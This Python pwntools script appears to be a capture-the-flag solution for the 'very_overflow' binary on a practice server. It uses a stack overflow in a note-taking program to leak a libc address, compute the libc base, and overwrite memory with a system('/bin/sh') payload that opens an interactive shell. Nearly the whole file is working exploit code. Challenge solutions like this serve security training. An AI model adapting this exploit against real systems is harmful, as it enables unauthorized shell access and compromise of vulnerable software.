#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
if argv[1]=='l':
    io = process('./very_overflow')
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
else:
    io = remote('hackme.inndy.tw', 7705)
    libc = ELF('../libc-2.23.so.i386')

elf= ELF('./very_overflow')
# libc = ELF('../libc-2.23.so.i386')

def addNote(note):
    io.sendline('1')
    io.sendline(note)

def editNote(noteID, note):
    io.sendlineafter('action: ', '2')
    io.sendlineafter('edit: ', str(noteID))
    io.sendlineafter('data: ', note)

def showNote(noteID):
    io.sendlineafter('action: ','3')
    io.sendlineafter('show: ', str(noteID))
if __name__ == '__main__':
    # use up the stack
    for i in range(128):
        addNote(chr(ord('a')+i%26)*132)
    addNote('x'*0x2a)
    showNote(129)
    io.recvuntil('Next note: ')
    start_main_addr = int(io.recvuntil('\n', drop = True),16)-247
    libc_base = start_main_addr-libc.sym['__libc_start_main']
    success('libc_start_main -> {:#x}'.format(start_main_addr))
    success('libc_base -> {:#x}'.format(libc_base))
    sys_addr = libc_base+libc.sym['system']
    bin_addr = libc_base+libc.search('/bin/sh').next()
    success('system -> {:#x}'.format(sys_addr))
    success('bin/sh -> {:#x}'.format(bin_addr))
    payload = 'a'*12+p32(sys_addr) + p32(bin_addr)*2
    editNote(128,payload)
    io.sendlineafter('action: ', '5')
    io.interactive()
    io.close()


